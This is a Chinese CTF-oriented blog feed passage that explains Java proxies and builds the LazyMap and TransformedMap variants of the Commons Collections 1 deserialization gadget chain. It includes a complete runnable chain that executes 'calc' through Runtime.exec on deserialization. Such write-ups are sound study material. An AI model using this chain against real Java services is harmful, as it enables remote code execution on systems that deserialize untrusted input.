        <content type="html"><![CDATA[<h1 id="Java代理机制及CC1链拾遗补阙"><a href="#Java代理机制及CC1链拾遗补阙" class="headerlink" title="Java代理机制及CC1链拾遗补阙"></a>Java代理机制及CC1链拾遗补阙</h1><p>在原先的CC1链解析中，我们利用<code>transformedMap</code>类的<code>checkSetValue()</code>方法触发<code>transform()</code>，此外CC1链还有另外一种实现方法，通过依赖<code>LazyMap</code>类的<code>get()</code>进行触发。在此之前，需要对Java的代理机制有一定了解</p><br/><h2 id="代理机制"><a href="#代理机制" class="headerlink" title="代理机制"></a>代理机制</h2><p>代理模式使用代理对象来代替对真实对象的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。Java中的代理大致可分成静态代理和动态代理两类</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>静态代理通过代理对象和目标对象实现同一个接口，达成了通过代理对象访问目标对象。下面是一个静态代理的实现步骤</p><p>定义接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RealCalculator</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义代理类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CalculatorProxy</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Calculator realCalculator;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalculatorProxy</span><span class="params">(Calculator realCalculator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.realCalculator = realCalculator;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用目标对象的add方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> realCalculator.add(a, b);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用静态代理模式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">Calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealCalculator</span>();</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CalculatorProxy</span>(Calc);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> proxy.add(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>main()</code>中，我们看似对<code>proxy</code>调用了<code>add()</code>方法，但实际上<code>proxy</code>并不是实际执行者，而是转手调用了目标对象<code>clac</code>去执行。此外不难发现，如果<code>Calculator</code>接口多了一个<code>divide()</code>方法，那么就需要同时对<code>RealCalculator</code>和<code>CalculatorProxy</code>进行重写，这是非常麻烦的，而动态代理则很好地解决了这个问题</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理又可分为Java内置的JDK动态代理和第三方的CGLIB动态代理，以理解CC1链的<code>LazyMap</code>线路为目的只需要了解JDK动态代理即可</p><p>在动态代理中，通过 <code>Proxy.newProxyInstance()</code> 方法创建代理对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span><br></pre></td></tr></table></figure><p>其中，<code>loader</code>作为类加载器，用于加载代理对象，<code>interfaces</code>指被代理类实现的接口，<code>h</code>需要传入一个<code>InvocationHandle</code>的实现类作为处理器类，可以通过重写<code>invoke</code>方法去规定代理对象的处理逻辑。同样是计算器的例子，看看动态代理是如何实现的</p><p>定义处理器类，重写<code>invoke()</code>方法，<code>proxy</code>是代理对象本身，<code>method</code>为被调用的方法，<code>args</code>为方法的参数数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CalcInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalcInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用动态代理模式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">Calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealCalculator</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Calculator) Proxy.newProxyInstance(</span><br><span class="line">            Calculator.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Calculator.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">CalcInvocationHandler</span>(Calc));</span><br><span class="line">        </span><br><span class="line">        System.out.println(proxy.add(<span class="number">10</span>, <span class="number">20</span>));</span><br><span class="line">        System.out.println(proxy.divide(<span class="number">20</span>, <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，对<code>proxy</code>调用<code>add()</code>方法，会触发<code>CalcInvocationHandler</code>实例的<code>invoke()</code>方法，调用目标对象的<code>add()</code>方法</p><blockquote><p>动态代理通过运行时生成实现指定接口的代理类，并缓存这些代理类以避免重复生成，将所有方法调用转发给<code>InvocationHandler</code>处理</p></blockquote><br/><h2 id="实现CommonsCollections1反序列化链的LazyMap路线"><a href="#实现CommonsCollections1反序列化链的LazyMap路线" class="headerlink" title="实现CommonsCollections1反序列化链的LazyMap路线"></a>实现CommonsCollections1反序列化链的LazyMap路线</h2><p>回到链中，当尝试去寻找调用<code>transform()</code>方法的上层方法时，当时选择了<code>TransformedMap</code>的<code>checkSetValue()</code>方法。除此以外，<code>LazyMap</code>的<code>get()</code>方法似乎也能满足这一条件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>if语句的绕过只要map中不存在传入的<code>key</code>就行</p><p>该类的构造器是<code>protected</code>修饰的方法，但是其静态的<code>decorate()</code>方法能够获得一个<code>LazyMap</code>实例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>至此，我们的链可以被改写为以下形式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">        lazyMap.get(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来，寻找调用了<code>get()</code>的上层，在<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法中就可以发现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">                    <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                            var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> var6;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>要执行到<code>Object var6 = this.memberValues.get(var4)</code>还有两层判断语句需要绕过，首先是<code>var4</code>不等于<code>&quot;equals&quot;</code>，由前面对<code>invoke()</code>方法的分析可以得知，<code>var4</code>此处指通过代理调用的方法不为<code>equals()</code>，而我们需要调用的是<code>entrySet()</code>。然后是<code>var5</code>的长度为0，<code>var5</code>指传入的参数数组的元素个数，<code>entrySet()</code>的参数个数是0，所以不用做刻意绕过<del>（怎么感觉说了等于没说</del></p><p>接下来就是实例化第一个<code>AnnotationInvocationHandler</code>，并将其作为代理处理器嵌入代理中，实例化过程用到反射这在上一篇已经有说明</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">Map&lt;Object,Object&gt; proxyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, annotationInvocationHandler1);</span><br></pre></td></tr></table></figure><p>然后再次实例化<code>AnnotationInvocationHandler</code>作为启动类，这一次传入的<code>memberValues</code>则是<code>proxyMap</code>以用来触发<code>invoke()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler2</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,proxyMap);</span><br></pre></td></tr></table></figure><p>至此，<code>LazyMap</code>版本的CommonsCollections1反序列化链也构造完毕了，全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map&lt;Object,Object&gt; proxyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, annotationInvocationHandler1);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler2</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,proxyMap);</span><br><span class="line">        serialize(annotationInvocationHandler2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser2.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser2.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果直接运行可能会报错，因为<code>entrySet()</code>方法期望返回一个Set对象，而我们这个链在遍历的时候直接去执行危险方法了，返回的是一个Process，如果想解决可以在transformer数组多放一个<code>ConstantTransformer</code>让其返回一个Set就行</p></blockquote><p>总结一下，在链中，一个<code>AnnotationInvocationHandler</code>对象被反序列化，这会触发其<code>readObject()</code>方法，<code>readObject()</code>在调用<code>entrySet()</code>遍历传入的代理对象时，调用我们设置的处理器对象<code>annotationInvocationHandler2</code>的<code>invoke()</code>，该方法对目标对象<code>lazymap</code>调用了<code>get()</code>方法，之后的过程则与先前的链一致</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ois.readObject()</span><br><span class="line">└── AnnotationInvocationHandler.readObject()</span><br><span class="line">    ├── this.memberValues.entrySet()</span><br><span class="line">    │   └── (Proxy Map).entrySet()  // 动态代理对象</span><br><span class="line">    │       └── AnnotationInvocationHandler.invoke()</span><br><span class="line">    │           ├── 方法名检查 (member.equals(&quot;equals&quot;)...)</span><br><span class="line">    │           ├── 参数检查 (paramTypes.length != 0)</span><br><span class="line">    │           └── this.memberValues.get(member)  // member = &quot;entrySet&quot;</span><br><span class="line">    │               └── (LazyMap).get(&quot;entrySet&quot;)</span><br><span class="line">    │                   ├── map.containsKey(&quot;entrySet&quot;)? // 不存在，执行transform</span><br><span class="line">    │                   └── this.factory.transform(&quot;entrySet&quot;)  // 关键触发点</span><br><span class="line">    │                       └── ChainedTransformer.transform()</span><br><span class="line">    │                           ├── ConstantTransformer.transform() → Runtime.class</span><br><span class="line">    │                           ├── InvokerTransformer.transform()  // getMethod(&quot;getRuntime&quot;)</span><br><span class="line">    │                           │   └── Runtime.class.getMethod(&quot;getRuntime&quot;)</span><br><span class="line">    │                           ├── InvokerTransformer.transform()  // invoke(null)</span><br><span class="line">    │                           │   └── method.invoke(null, new Object[0]) → Runtime实例</span><br><span class="line">    │                           └── InvokerTransformer.transform()  // exec(&quot;calc&quot;)</span><br><span class="line">    │                               └── Runtime.getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">    │                                   ├── Process对象返回</span><br><span class="line">    │                                   └── 类型转换异常 (Process → Set)</span><br><span class="line">    │</span><br><span class="line">    ├── for (Map.Entry&lt;String, Object&gt; var5 : this.memberValues.entrySet())</span><br><span class="line">    │   └── // 此处本应遍历，但因类型异常中断</span><br><span class="line">    │</span><br><span class="line">    └── 其他readObject逻辑...</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 拾遗补阙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections1反序列化链简析</title>
      <link href="/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/"/>
      <url>/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections1反序列化链简析"><a href="#CommonsCollections1反序列化链简析" class="headerlink" title="CommonsCollections1反序列化链简析"></a>CommonsCollections1反序列化链简析</h1><p>如果Java项目具有<code>Commons Collections3.2.1</code>依赖，则会存在反序列化利用漏洞</p><p>该链中，终点是<code>InvokerTransformer</code>类，它是接口<code>transform</code>的一个实现类，其重写的<code>transform()</code>方法可以通过反射的方式调用危险方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最终执行的就是</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><p>接下来，寻找调用了<code>transform</code>的类或实例，在<code>TransformedMap</code>类下的<code>checkSetValue()</code>方法存在</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可惜，该方法及该类的构造器都被<code>protected</code>修饰，无法在类外调用，但是往上翻可以看到一个<code>decorate()</code>方法可以对<code>valueTransformer</code>进行赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先对现有的链进行包装</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br></pre></td></tr></table></figure><p>下一步是找到能触发<code>checkSetValue()</code>方法的机会，从<code>MapEntry</code>类的<code>setValue()</code>方法里看到了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>简单说的话，我们从<code>TransformedMap</code>里遍历出的元素就是<code>MapEntry</code>的实例，所以可以用for增强提取出单个<code>entry</code>去使用<code>setValue()</code>方法，处理完后的链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;Object,Object&gt; entry : transformedMap.entrySet()) &#123;</span><br><span class="line">    entry.setValue(Runtime.getRuntime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细点说，<code>transformedMap</code>在遍历调用<code>entrySet()</code>时，使用了父类重写的<code>entrySet()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">this</span>.map.entrySet(), <span class="built_in">this</span>) : <span 